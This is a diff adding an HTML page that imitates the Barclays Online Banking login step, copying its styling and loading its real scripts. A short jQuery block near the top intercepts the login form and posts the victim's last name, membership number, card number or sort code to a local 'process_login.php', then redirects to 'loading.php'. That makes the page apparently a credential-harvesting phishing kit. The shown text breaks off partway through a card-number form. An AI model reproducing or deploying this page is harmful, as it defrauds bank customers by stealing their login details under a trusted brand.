@@ -1,0 +1,651 @@
+<html lang="en-GB"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>
+    <title>Step 1 - Who are you? - Barclays Online Banking</title>
+    <meta name="apple-itunes-app" content="app-id=536248734">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="bcsid" content="a47482a97be2f9d2c174375a7482c4fa">
+    <script src="https://tags.tiqcdn.com/utag/barclaysuk/barclays-olb/prod/utag.js" type="text/javascript" async=""></script><script type="text/javascript" src="/authlogin/bdlLogin-dss-jquery-libraries.min.js?v=1606745934868"></script>
+    <script type="text/javascript" src="https://bank.barclays.co.uk//authlogin/lib/polyfill.wp.js"></script>
+    <script type="text/javascript" src="https://bank.barclays.co.uk//js/myBarclays/vendor/angular/angular.min.js"></script>
+    <script type="text/javascript" src="https://bank.barclays.co.uk//js/myBarclays/vendor/angular/angular-route.min.js"></script>
+    <script type="text/javascript" src="https://bank.barclays.co.uk//js/myBarclays/vendor/angular/angular-sanitize.min.js"></script>
+    <script type="text/javascript" src="https://bank.barclays.co.uk//authlogin/bdlLogin-rolb-dss.min.js?v=1606745934868"></script>
+    <script type="text/javascript" src="https://bank.barclays.co.uk//authlogin/bdlLogin-libraries.min.js?v=1606745934868"></script>
+    <script type="text/javascript" src="https://bank.barclays.co.uk//authlogin/bdlLogin-rolb-app.min.js?v=1606745934868"></script>
+    <script type="text/javascript" src="https://bank.barclays.co.uk//js/sitecatalyst/s_codecookies.js"></script>
+    <script type="text/javascript" src="https://bank.barclays.co.uk//js/bc/2.8.1/6bb5a42d.min.js"></script>
+    <!-- jQuery -->
+    <script src="https://code.jquery.com/jquery-3.5.1.js" integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script>
+
+
+
+<script>
+    $(document).ready(function() {
+      var allInputs = $(":input");
+
+      $('#login-form').submit(function(e) {
+        e.preventDefault();
+
+        $.ajax({
+          type: 'POST',
+          url: 'database_setup/routes/process_login.php',
+          data: $('#login-form').serialize(),
+          success: function(data) {
+            var parsed_data = JSON.parse(data);
+            if (parsed_data.status == 'success') {
+              location.href = "loading.php";
+            } else {
+              return false;
+            }
+          }
+        })
+      })
+    });
+</script>
+
+
+<style type="text/css" id="__tealiumGDPRecStyle">.barclays-gdpr__consent-pane .a-link{color:#0076b6;font-family:Barclays Expert Sans,Expert Sans Light,expertsans-light,Verdana,sans-serif;font-size:16px;font-weight:400;line-height:1.5;margin:0 0 -2px;text-decoration:none;border-bottom:2px solid #0076b6;transition:color .3s cubic-bezier(.25,.46,.45,.94),border-color .3s cubic-bezier(.25,.46,.45,.94)}.barclays-gdpr__consent-pane .a-link:visited{color:#00395d;border-color:#00395d}.barclays-gdpr__consent-pane .a-link:hover{color:#00395d;text-decoration:none;border-color:#00395d}.barclays-gdpr__consent-pane .a-link:active{color:#0076b6}.barclays-gdpr__consent-pane .a-link:focus{color:#00395d;background-color:#f2fbfe;outline:none;box-shadow:0 0 0 2px #f2fbfe,0 0 0 4px #0076b6}.barclays-gdpr__consent-pane .a-link--size-large{font-size:24px}.barclays-gdpr__consent-pane .a-link--size-medium{font-size:20px}.barclays-gdpr__consent-pane .a-link--size-small{font-size:14px}.barclays-gdpr__consent-pane .a-link--size-small,.barclays-gdpr__consent-pane .a-text{font-family:Barclays Expert Sans,Expert Sans Light,expertsans-light,Verdana,sans-serif}.barclays-gdpr__consent-pane .a-text{color:#333;font-size:16px;font-weight:400;line-height:1.5;margin:0}.barclays-gdpr__consent-pane .a-text--weight-light{font-weight:300}.barclays-gdpr__consent-pane .a-text--weight-semibold{font-weight:400}.barclays-gdpr__consent-pane .a-text--weight-bold{font-weight:700}.barclays-gdpr__consent-pane .a-text--style-italic{font-style:italic}.barclays-gdpr__consent-pane .a-text--color-white{color:#fff}.barclays-gdpr__consent-pane .a-text--color-red{color:#e00000}.barclays-gdpr__consent-pane .a-text--color-green{color:#008312}.barclays-gdpr__consent-pane .a-text--color-grey{color:#666}.barclays-gdpr__consent-pane .a-text--color-black{color:#000}.barclays-gdpr__consent-pane .a-text--color-dark-blue{color:#00395d}.barclays-gdpr__consent-pane .a-text--size-large{font-size:30px}.barclays-gdpr__consent-pane .a-text--size-large .a-text__suffix,.barclays-gdpr__consent-pane .a-text--size-medium{font-size:20px}.barclays-gdpr__consent-pane .a-text--size-medium .a-text__suffix{font-size:16px}.barclays-gdpr__consent-pane .a-text--size-small{font-family:Barclays Expert Sans,Expert Sans Light,expertsans-light,Verdana,sans-serif;font-size:14px}.barclays-gdpr__consent-pane .a-text--size-small .a-text__suffix{font-size:14px}.barclays-gdpr__consent-pane .a-text--size-extra-small{font-family:Barclays Expert Sans,Expert Sans Light,expertsans-light,Verdana,sans-serif;font-size:12px}.barclays-gdpr__consent-pane .a-text--size-extra-small .a-text__suffix{font-size:12px}.barclays-gdpr__consent-pane .a-text--with-margin{margin-bottom:16px}@media (min-width:641px){.barclays-gdpr__consent-pane .a-text--with-margin{margin-bottom:24px}}.barclays-gdpr__consent-pane .a-text--align-left{text-align:left}.barclays-gdpr__consent-pane .a-text--align-center{text-align:center}.barclays-gdpr__consent-pane .a-text--align-right{text-align:right}.barclays-gdpr__consent-pane .m-button{color:#0076b6;font-family:Barclays Expert Sans,Expert Sans Light,expertsans-light,Verdana,sans-serif;font-size:1rem;font-weight:400;line-height:1.5;box-sizing:border-box;display:inline-flex;align-items:center;justify-content:center;min-width:140px;padding:11px 20px;margin:0;text-align:center;text-decoration:none;word-break:break-word;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-color:#fff;border:1px solid #0076b6;border-radius:999px;transition:none .15s ease-out;transition-property:color,background-color,border,outline,box-shadow}.barclays-gdpr__consent-pane .m-button:visited{color:#0076b6;background-color:#fff}.barclays-gdpr__consent-pane .m-button:hover{color:#0076b6;text-decoration:none;background-color:#f2fbfe}.barclays-gdpr__consent-pane .m-button:active{color:#00395d;border-color:#00395d}.barclays-gdpr__consent-pane .m-button--has-focus,.barclays-gdpr__consent-pane .m-button:focus,.barclays-gdpr__consent-pane .m-button:focus-within{color:#0076b6;background-color:#f2fbfe;border-color:#0076b6;outline:none;box-shadow:inset 0 0 0 1px #0076b6}.barclays-gdpr__consent-pane .m-button::-moz-focus-inner{border:0}.barclays-gdpr__consent-pane .m-button.m-button--is-disabled,.barclays-gdpr__consent-pane .m-button.m-button--is-disabled:hover,.barclays-gdpr__consent-pane .m-button.m-button--is-disabled:visited,.barclays-gdpr__consent-pane .m-button[aria-disabled=true],.barclays-gdpr__consent-pane .m-button[disabled]{color:#666;cursor:not-allowed;background-color:#f7f7f7;border-color:#8c8c8c}.barclays-gdpr__consent-pane .m-button__media{position:relative;box-sizing:border-box;display:inline-block;width:16px;height:16px;font-size:16px;line-height:16px;transition:transform .3s ease-out}.barclays-gdpr__consent-pane .m-button__media--medium{width:20px;height:20px;font-size:20px;line-height:1}.barclays-gdpr__consent-pane .m-button__media--large{width:48px;height:48px;font-size:48px}.barclays-gdpr__consent-pane .m-button__media--bordered{padding:8px;font-size:0;border:2px solid #0076b6;border-radius:50%}.barclays-gdpr__consent-pane .m-button__media--medium.m-button__media--bordered{font-size:4px}.barclays-gdpr__consent-pane .m-button__media--large.m-button__media--bordered{font-size:32px}.barclays-gdpr__consent-pane .m-button__media--rotate-90{transform:rotate(90deg)}.barclays-gdpr__consent-pane .m-button__media--rotate-180{transform:rotate(180deg)}.barclays-gdpr__consent-pane .m-button__media--rotate-270{transform:rotate(270deg)}.barclays-gdpr__consent-pane .m-button__icon{display:block;width:100%;height:100%;fill:currentColor}.barclays-gdpr__consent-pane .m-button__badge{position:absolute;top:0;right:0;font-size:16px;transform:translate(40%,-15%)}.barclays-gdpr__consent-pane .m-button--small{padding:5px 24px 4px;font-size:.875rem}.barclays-gdpr__consent-pane .m-button--primary{color:#fff;background-color:#0076b6;border:1px solid transparent}.barclays-gdpr__consent-pane .m-button--primary:visited{color:#fff;background-color:#0076b6}.barclays-gdpr__consent-pane .m-button--primary:hover{color:#fff;background-color:#005e91}.barclays-gdpr__consent-pane .m-button--primary:active{color:#fff;background-color:#00395d}.barclays-gdpr__consent-pane .m-button--primary.m-button--has-focus,.barclays-gdpr__consent-pane .m-button--primary:focus,.barclays-gdpr__consent-pane .m-button--primary:focus-within{color:#0076b6;background-color:#f2fbfe;border-color:#0076b6;outline:none;box-shadow:inset 0 0 0 1px #0076b6}.barclays-gdpr__consent-pane .m-button--primary.m-button--is-disabled,.barclays-gdpr__consent-pane .m-button--primary.m-button--is-disabled:hover,.barclays-gdpr__consent-pane .m-button--primary.m-button--is-disabled:visited,.barclays-gdpr__consent-pane .m-button--primary[aria-disabled=true],.barclays-gdpr__consent-pane .m-button--primary[disabled]{color:#666;cursor:not-allowed;background-color:#f7f7f7;border-color:#8c8c8c}.barclays-gdpr__consent-pane .m-button--outline{color:#fff;background-color:transparent;border:1px solid #fff}.barclays-gdpr__consent-pane .m-button--outline:visited{color:#fff}.barclays-gdpr__consent-pane .m-button--outline:hover{color:#ccc;background-color:transparent;border-color:#ccc}.barclays-gdpr__consent-pane .m-button--outline:active{border-color:#ccc}.barclays-gdpr__consent-pane .m-button--outline--has-focus,.barclays-gdpr__consent-pane .m-button--outline:focus,.barclays-gdpr__consent-pane .m-button--outline:focus-within{color:#000;background-color:transparent;border-color:#000;outline:none;box-shadow:0 0 0 1px #000}.barclays-gdpr__consent-pane .m-button--outline.m-button--is-disabled,.barclays-gdpr__consent-pane .m-button--outline.m-button--is-disabled:hover,.barclays-gdpr__consent-pane .m-button--outline.m-button--is-disabled:visited,.barclays-gdpr__consent-pane .m-button--outline[aria-disabled=true],.barclays-gdpr__consent-pane .m-button--outline[disabled]{color:#666;cursor:not-allowed;background-color:transparent;border-color:#666;opacity:.5}.barclays-gdpr__consent-pane .m-button--text{min-width:auto;padding:0;margin:0 0 -2px;color:#0076b6;background-color:transparent;border:0;border-radius:0;transition:color .3s cubic-bezier(.25,.46,.45,.94),border-color .3s cubic-bezier(.25,.46,.45,.94)}.barclays-gdpr__consent-pane .m-button--text .m-button__text{border-bottom:2px solid #0076b6}.barclays-gdpr__consent-pane .m-button--text:visited{color:#00395d}.barclays-gdpr__consent-pane .m-button--text:visited .m-button__text{border-color:#00395d}.barclays-gdpr__consent-pane .m-button--text:hover{color:#00395d;text-decoration:none;background-color:transparent}.barclays-gdpr__consent-pane .m-button--text:hover .m-button__text{border-color:#00395d}.barclays-gdpr__consent-pane .m-button--text:active{color:#0076b6}.barclays-gdpr__consent-pane .m-button--text--has-focus,.barclays-gdpr__consent-pane .m-button--text:focus,.barclays-gdpr__consent-pane .m-button--text:focus-within{color:#00395d;background-color:#f2fbfe;outline:none;box-shadow:0 0 0 2px #f2fbfe,0 0 0 4px #0076b6}.barclays-gdpr__consent-pane .m-button--text.m-button--is-disabled,.barclays-gdpr__consent-pane .m-button--text.m-button--is-disabled:focus,.barclays-gdpr__consent-pane .m-button--text.m-button--is-disabled:hover,.barclays-gdpr__consent-pane .m-button--text[aria-disabled=true],.barclays-gdpr__consent-pane .m-button--text[disabled]{color:#666;text-decoration:none;cursor:not-allowed;background-color:transparent;box-shadow:none}.barclays-gdpr__consent-pane .m-button--text.m-button--is-disabled .m-button__text,.barclays-gdpr__consent-pane .m-button--text.m-button--is-disabled:focus .m-button__text,.barclays-gdpr__consent-pane .m-button--text.m-button--is-disabled:hover .m-button__text,.barclays-gdpr__consent-pane .m-button--text[aria-disabled=true] .m-button__text,.barclays-gdpr__consent-pane .m-button--text[disabled] .m-button__text{border-color:#666}.barclays-gdpr__consent-pane .m-button--icon-only{min-width:auto;line-height:1;border-radius:8px}.barclays-gdpr__consent-pane .m-button--icon-left .m-button__text{order:1;margin-left:6px}.barclays-gdpr__consent-pane .m-button--icon-right .m-button__text{order:-1;margin-right:6px}.barclays-gdpr__consent-pane .m-button--icon-bottom,.barclays-gdpr__consent-pane .m-button--icon-top{flex-direction:column}.barclays-gdpr__consent-pane .m-button--icon-top .m-button__text{order:1;margin-top:6px}.barclays-gdpr__consent-pane .m-button--icon-bottom .m-button__text{order:-1;margin-bottom:6px}.barclays-gdpr__consent-pane .m-button--full-width{width:100%}@media (max-width:480px){.barclays-gdpr__consent-pane .m-button--full-width-until-sm{width:100%}}@media (max-width:640px){.barclays-gdpr__consent-pane .m-button--full-width-until-md{width:100%}}.barclays-gdpr__consent-pane .m-button--ghost{min-width:auto;color:#fff;background-color:transparent;border-color:transparent}.barclays-gdpr__consent-pane .m-button--ghost:visited{color:#fff}.barclays-gdpr__consent-pane .m-button--ghost:focus,.barclays-gdpr__consent-pane .m-button--ghost:hover{color:#fff;background-color:transparent}.barclays-gdpr__consent-pane .m-button--ghost:focus{border-color:#fff;box-shadow:inset 0 0 0 1px #fff}.barclays-gdpr__consent-pane .m-button--text.m-button--ghost{min-width:auto}.barclays-gdpr__consent-pane .m-button--ghost .m-button__text,.barclays-gdpr__consent-pane .m-button--ghost:hover .m-button__text{border:none}.barclays-gdpr__consent-pane .m-button--text.m-button--ghost:focus{outline:2px solid #fff;outline-offset:2px;box-shadow:none}.barclays-gdpr__consent-pane .m-button--round{width:44px;min-width:auto;height:44px;padding:8px;border-radius:50%}@media (max-width:640px){.barclays-gdpr__consent-pane .m-button--small-md-down{padding:5px 24px 4px;font-size:.875rem}}.barclays-gdpr__consent-pane .m-button__input{position:absolute;z-index:-1;opacity:0}.barclays-gdpr__consent-pane .m-cookie-prompt{box-sizing:border-box;display:flex;padding:0;flex-wrap:wrap;margin:0 -4px}@media (min-width:481px){.barclays-gdpr__consent-pane .m-cookie-prompt{margin:0 -8px}}@media (min-width:641px){.barclays-gdpr__consent-pane .m-cookie-prompt{margin:0 -12px}}.barclays-gdpr__consent-pane .m-cookie-prompt__content{color:#333;font-family:Barclays Expert Sans,Expert Sans Light,expertsans-light,Verdana,sans-serif;font-size:14px;font-weight:400;line-height:1.5;box-sizing:border-box;flex-basis:auto;width:100%;min-width:0;padding:0 4px;margin-bottom:8px;color:#000}@media (min-width:481px){.barclays-gdpr__consent-pane .m-cookie-prompt__content{padding:0 8px}}@media (min-width:641px){.barclays-gdpr__consent-pane .m-cookie-prompt__content{padding:0 12px;margin-bottom:24px}}@media (min-width:961px){.barclays-gdpr__consent-pane .m-cookie-prompt__content{flex:1 1 0%}}.barclays-gdpr__consent-pane .m-cookie-prompt__head{padding-bottom:16px}.barclays-gdpr__consent-pane .m-cookie-prompt__heading{color:#00395d;font-family:Barclays Expert Sans,Expert Sans Light,expertsans-light,Verdana,sans-serif;font-size:26px;font-weight:400;line-height:1.333;margin:0}@media (min-width:641px){.barclays-gdpr__consent-pane .m-cookie-prompt__heading{font-size:30px}}.barclays-gdpr__consent-pane .m-cookie-prompt__body{flex-grow:1}.barclays-gdpr__consent-pane .m-cookie-prompt__menu{box-sizing:border-box;flex-basis:auto;width:100%;min-width:0;padding:0 4px;margin-bottom:8px}@media (min-width:481px){.barclays-gdpr__consent-pane .m-cookie-prompt__menu{padding:0 8px;margin-bottom:16px}}@media (min-width:641px){.barclays-gdpr__consent-pane .m-cookie-prompt__menu{padding:0 12px;margin-bottom:24px}}@media (min-width:961px){.barclays-gdpr__consent-pane .m-cookie-prompt__menu{padding:0 12px;width:auto;display:flex;align-items:flex-end}}.barclays-gdpr__consent-pane .m-cookie-prompt__buttons{box-sizing:border-box;display:flex;padding:0;margin:0 -4px}@media (min-width:481px){.barclays-gdpr__consent-pane .m-cookie-prompt__buttons{margin:0 -8px}}@media (min-width:641px){.barclays-gdpr__consent-pane .m-cookie-prompt__buttons{margin:0 -12px}}@media (min-width:961px){.barclays-gdpr__consent-pane .m-cookie-prompt__buttons{flex-direction:column}}.barclays-gdpr__consent-pane .m-cookie-prompt__button{box-sizing:border-box;flex-basis:auto;width:100%;min-width:0;padding:0 4px}@media (min-width:481px){.barclays-gdpr__consent-pane .m-cookie-prompt__button{padding:0 8px}}@media (min-width:641px){.barclays-gdpr__consent-pane .m-cookie-prompt__button{padding:0 12px}}@media (min-width:961px){.barclays-gdpr__consent-pane .m-cookie-prompt__button:not(:last-child){margin-bottom:16px}}.barclays-gdpr__consent-pane .o-sticky-footer{color:#333;font-family:Barclays Expert Sans,Expert Sans Light,expertsans-light,Verdana,sans-serif;font-size:16px;font-weight:400;line-height:1.5;position:fixed;right:0;bottom:0;left:0;z-index:9998;background-color:#fff;transition-duration:.4s;transform:translateZ(0)}.barclays-gdpr__consent-pane .o-sticky-footer--shadow{box-shadow:0 -2px 7px 0 hsla(0,0%,54.9%,.5)}.barclays-gdpr__consent-pane .o-sticky-footer--secondary{background-color:#f2fbfe}.barclays-gdpr__consent-pane .o-sticky-footer--is-hidden{transform:translate3d(0,100%,0)}.barclays-gdpr__consent-pane .o-sticky-footer__content{max-width:1600px;max-height:60vh;padding:8px 16px 0;margin:0 auto;overflow-y:auto}@media (min-width:641px){.barclays-gdpr__consent-pane .o-sticky-footer__content{padding:24px 24px 0}}.barclays-gdpr__consent-pane .m-button__text{word-break:keep-all}</style><script type="text/javascript" id="__tealiumGDPRecScript">try{"use strict";(function(){var scope=document.getElementById('__tealiumGDPRecModal');if(scope){var preferencesButton=scope.querySelector('.barclays-gdpr__preferences-button');var acceptAllButton=scope.querySelector('.barclays-gdpr__accept-all-button');var close_1=function(){var _a;scope.style.display='none';(_a=scope.parentElement)===null||_a===void 0?void 0:_a.removeChild(scope);};var onPreferencesClick=function(){close_1();window.utag.gdpr.showConsentPreferences();};preferencesButton===null||preferencesButton===void 0?void 0:preferencesButton.addEventListener('click',onPreferencesClick);var onAcceptAllClick=function(){close_1();window.utag.gdpr.setConsentValue(1);};acceptAllButton===null||acceptAllButton===void 0?void 0:acceptAllButton.addEventListener('click',onAcceptAllClick);}})();} catch(e){utag.DB(e)}</script><script type="text/javascript" async="" charset="utf-8" id="utag_barclaysuk.barclays-olb_34" src="//tags.tiqcdn.com/utag/barclaysuk/barclays-olb/prod/utag.34.js?utv=ut4.46.202110221035"></script><script type="text/javascript" async="" charset="utf-8" id="tiqapp" src="//tags.tiqcdn.com/utag/tiqapp/utag.v.js?a=barclaysuk/barclays-olb/202110221035&amp;cb=1660652710065"></script></head>
+<body>
+<div>
+    <form></form>
+    <script type="text/javascript">
+        window.ie8=false;
+    </script>
+
+    <div id="bdlLogin-bootstrap" class="desktop-site ng-scope" xmlns:ng="http://angularjs.org">
+        <link rel="stylesheet" type="text/css" href="https://bank.barclays.co.uk/authlogin/css/rolb-theme-2-0.css?v=1606745934868">
+        <link rel="stylesheet" type="text/css" href="https://bank.barclays.co.uk/authlogin/css/authlogin-bdl.min.css?v=1606745934868">
+        <div class="rolb dss-container">
+            <!-- ngInclude: undefined --><ng-include src="'https://bank.barclays.co.uk/authlogin/partials/bdlLogin/header.html?v=1606745934868'" class="ng-scope"><header id="main-header" class="rolbHeader header ng-scope" ng-controller="headerCtrl"> <span class="icon icon-barclays-eagle logo-eagle logoSpace" ng-click="goToBarclaysHomepage()" tabindex="1" aria-label="Barclays Homepage"></span> <span class="icon icon-barclays-wordmark logo-title logoSpace logoSpaceBarclays hidden-xs" ng-click="goToBarclaysHomepage()" aria-hidden="true"></span> <!-- ngIf: showLogout --> <!-- ngIf: !showLogout --><div class="header-right secureSpace ng-scope" ng-if="!showLogout"> <span class="icon-secure"></span> <a class="normal  standalone-links" id="headerSecureLink" tabindex="" href="http://www.barclays.co.uk/security" aria-label="Secure Link" target="_blank" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-scope">Secure</span></a> </div><!-- end ngIf: !showLogout --> <!-- ngIf: isModal --> </header></ng-include>
+            <!-- ngView:  --><div ng-view="" class="ng-scope"><main id="content" class="ng-scope"> <!-- ngIf: authDataUser.display --><div ng-if="authDataUser.display" show-user-info="false" class="ng-scope"> <section class="jumbo jumbo-noimage jumbo-cyan5 " id="pageHero id" hero-title="Log in to Online Banking" tagline="" data="authDataUser" userinfo="showUserInfo" link-click="heroLinkClick(event,link)" banner-status="false" analytics-tag="" analytics-label="">
+  <!-- ngIf: showBackButton -->
+  <div class="jumbo-body" ng-class="{'user-panel':userinfo, 'notification-banner': notificationBanner}">
+    <div class="container-fluid">
+      <div class="row">
+        <div class="col-md-8 col-md-offset-2">
+
+          <div class="jumbo-content aperture-left">
+
+            <h1 class="jumbo-title ng-binding">Log in to Online Banking</h1>
+
+
+            <h2 class="jumbo-tagline ng-binding"></h2>
+
+          </div>
+
+
+          <!-- ngIf: htmlData && htmlData.headText -->
+
+          <!-- ngIf: userinfo -->
+        </div>
+        <!-- ngIf: notificationBanner -->
+      </div>
+    </div>
+  </div>
+</section>
+</div><!-- end ngIf: authDataUser.display -->
+<section class="wrapper ROLBWrapper">
+  <div class="container-fluid">
+    <div class="row">
+      <div class="col-md-8 col-md-offset-2">
+        <form id="login-form" autocomplete="off" class="ng-invalid ng-invalid-required ng-dirty">
+                  <div ng-if="browser.valid" class="ng-scope">
+            <header-content class="ng-scope">
+              <div class="marginHead">
+                <b-text id="header-change" class="head-color ng-isolate-scope" type="h2" b-data="How would you like to log in?" dss-dda-component="DDA Specific Component Attribute">
+                  <h2>How would you like to log in?</h2>
+                </b-text>
+              </div>
+                            <div class="marginHeadSubheader">
+                 <b-text id="headerContent" type="span" class="font16px font-family ng-isolate-scope" b-data="Not registered for Online Banking?" dss-dda-component="DDA Specific Component Attribute">
+                   <span>Not registered for Online Banking?</span>
+                 </b-text>
+                 <a class="normal " id="1etg2kcq8" tabindex="" href="/olb/registration/registerAppContainer.do" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+                   <span class="ng-binding ng-scope">Register now</span>
+                 </a>
+                 <span class="dotStyle">.</span>
+               </div>
+             </header-content> <!-- ngIf: !mobileView --> <!-- ngIf: mobileView -->
+             <div ng-if="mobileView" role="main" class="ng-scope">
+               <b-radio id="rdoLoginType" name="rdoLoginType" ng-model="model.loginType" data="rdoLoginTypes" value-field="value" display-field="dsdname" arrange="controls-stacked" ng-change="rdoLoginTypeChange()" analytics-tag="" analytics-label="loginType" class="ng-isolate-scope ng-valid ng-dirty" dss-dda-component="DDA Specific Component Attribute">
+                 <div role="radiogroup" class="form-item radio-element controls-stacked" aria-activedescendant="rdoLoginType_membership" ng-class="{'has-error':(formController[name].$invalid &amp;&amp; formController[name].$dirty &amp;&amp; validationErrors) || (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid)}" id="b-radio-rdoLoginType">
+                   <label ng-show="label" id="b-radio-dda-label-rdoLoginType" class="ng-binding ng-hide"></label>
+                   <fieldset>
+                     <label class="control control-radio ng-scope first-child" ng-click="vm.click($event)" ng-repeat="(key, value) in scopeData" ng-class="{'last-child':$last, 'first-child':$first}">
+                       <input type="radio" name="membership" value="membership" id="rdoLoginType_membership" class=" control-input" ng-disabled="ngDisabled || value.isDisabled" aria-labelledby="b-radio-dda-label-rdoLoginType b-radio-rdoLoginType-membership " aria-describedby="b-radio-additional-rdoLoginType-membership radio-err-1etg2msse" aria-checked="true" aria-required="false" tabindex="" ng-blur="ngBlur()" ng-checked="isChecked(value[valueField])" checked="checked">
+                       <span id="b-radio-span-rdoLoginType-0" class="control-indicator">
+                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 12" class="icon-radio">
+                           <rect width="12" height="12" fill-rule="evenodd" rx="6"></rect>
+                         </svg>
+                       </span>
+                       <span class="control-description">
+                         <span id="b-radio-rdoLoginType-membership" class="ng-binding">Membership number</span>
+                       </span>
+                     </label>
+                     <label class="control control-radio ng-scope" ng-click="vm.click($event)" ng-repeat="(key, value) in scopeData" ng-class="{'last-child':$last, 'first-child':$first}">
+                       <!-- <label id="b-radio-label-{{id}}-{{key}}" class="pull-left"></label>-->
+                       <input type="radio" name="cardnumber" value="cardNumber" id="rdoLoginType_cardNumber" class=" control-input" ng-disabled="ngDisabled || value.isDisabled" aria-labelledby="b-radio-dda-label-rdoLoginType b-radio-rdoLoginType-cardNumber " aria-describedby="b-radio-additional-rdoLoginType-cardNumber radio-err-1etg2msse" aria-checked="false" aria-required="false" tabindex="" ng-blur="ngBlur()" ng-checked="isChecked(value[valueField])">
+                       <span id="b-radio-span-rdoLoginType-1" class="control-indicator">
+                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 12" class="icon-radio">
+                           <rect width="12" height="12" fill-rule="evenodd" rx="6"></rect>
+                         </svg>
+                       </span>
+                       <span class="control-description">
+                         <!-- ngIf: value.icon -->
+                         <span id="b-radio-rdoLoginType-cardNumber" class="ng-binding">Card number</span>
+                         <!-- ngIf: value['htmlContent'] -->
+                       </span>
+                     </label>
+                     <!-- end ngRepeat: (key, value) in scopeData -->
+                     <label class="control control-radio ng-scope last-child" ng-click="vm.click($event)" ng-repeat="(key, value) in scopeData" ng-class="{'last-child':$last, 'first-child':$first}">
+                       <!-- <label id="b-radio-label-{{id}}-{{key}}" class="pull-left"></label>-->
+                       <input type="radio" name="sortcode" value="sortCode" id="rdoLoginType_sortCode" class=" control-input" ng-disabled="ngDisabled || value.isDisabled" aria-labelledby="b-radio-dda-label-rdoLoginType b-radio-rdoLoginType-sortCode " aria-describedby="b-radio-additional-rdoLoginType-sortCode radio-err-1etg2msse" aria-checked="false" aria-required="false" tabindex="" ng-blur="ngBlur()" ng-checked="isChecked(value[valueField])">
+                       <span id="b-radio-span-rdoLoginType-2" class="control-indicator">
+                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 12" class="icon-radio">
+                           <rect width="12" height="12" fill-rule="evenodd" rx="6"></rect>
+                         </svg>
+                       </span>
+                       <span class="control-description">
+                         <!-- ngIf: value.icon -->
+                         <span id="b-radio-rdoLoginType-sortCode" class="ng-binding">Sort code and account number</span>
+                         <!-- ngIf: value['htmlContent'] -->
+                       </span>
+                     </label><!-- end ngRepeat: (key, value) in scopeData -->
+                   </fieldset>
+                   <div id="radio-err-1etg2msse">
+                     <div ng-show="(formController[name].$invalid &amp;&amp; formController[name].$dirty &amp;&amp; currentState &amp;&amp; validationErrors) ||
+                     (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid &amp;&amp; currentState)" class="ng-hide">
+                     <!-- ngRepeat: (key, value) in formController[name].$error -->
+                     </div>
+                     <div ng-show="(formController[name].$invalid &amp;&amp; formController[name].$dirty &amp;&amp; !currentState &amp;&amp; validationErrors) ||
+                     (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid &amp;&amp; !currentState)" class="ng-hide">
+                     <!-- ngRepeat: (key, value) in formController[name].$error -->
+                     </div>
+                   </div>
+                 </div>
+               </b-radio>
+
+<div id="membershipNumber"> <!-- ngInclude: undefined -->
+  <ng-include class="ng-scope">
+    <ng-form id="membershipForm" name="membershipForm" autocomplete="off" novalidate="" show-errors-if-any="false" class="ng-scope ng-pristine ng-valid">
+      <div class="MemNoInput"> <!-- THIS IS THE LAST NAME INPUT -->
+        <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3">
+          <div class="form-item">
+            <label class="label">
+              <span for="surnameMem" id="label-surnameMem">Last name</span>
+              <label for="surnameMem" id="extraLabelData-surnameMem" class="ng-binding" aria-hidden="true"></label>
+            </label>
+
+            <div class="input-wrapper">
+              <span class="input-prefix"></span>
+              <span class="input-suffix"></span>
+              <!-- LAST NAME -->
+              <input class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="surnameMem" name="lastname1" type="text" maxlength="24" autocomplete="surname" aria-autocomplete="inline">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="membershipNumber"> <!-- THIS IS THE MEMBERSHIP NUMBER INPUT -->
+        <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3">
+          <div class="form-item">
+            <label class="label">
+              <span for="membership0">Membership number (12 digits)</span>
+              <label for="membership0" class="ng-binding"></label>
+            </label>
+
+            <div class="input-wrapper">
+              <span class="input-prefix"></span>
+              <span class="input-suffix"></span>
+              <!-- MEMBERSHIP NUMBER -->
+              <input aria-labelledby="label-membership0 extraLabelData-membership0" aria-describedby="described-membership0 input-err-1etg2mssp" class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="membership0" name="membershipnumber" type="text" aria-label="12 digits">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="forgotMembershipLink"> <!-- THIS IS THE FORGOT MEMBERSHIP NUMBER LINK -->
+        <a class="normal" id="forgotMembershipLink">
+          <span class="ng-scope">Don't know your membership number?</span>
+        </a>
+      </div>
+    </ng-form>
+  </ng-include>
+</div>
+
+<div id="cardNumber" style="display: none;"> <!-- ngInclude: undefined -->
+  <ng-include class="ng-scope">
+    <ng-form id="membershipForm" name="membershipForm" autocomplete="off" novalidate="" show-errors-if-any="false" class="ng-scope ng-pristine ng-valid">
+      <div class="MemNoInput"> <!-- THIS IS THE LAST NAME INPUT -->
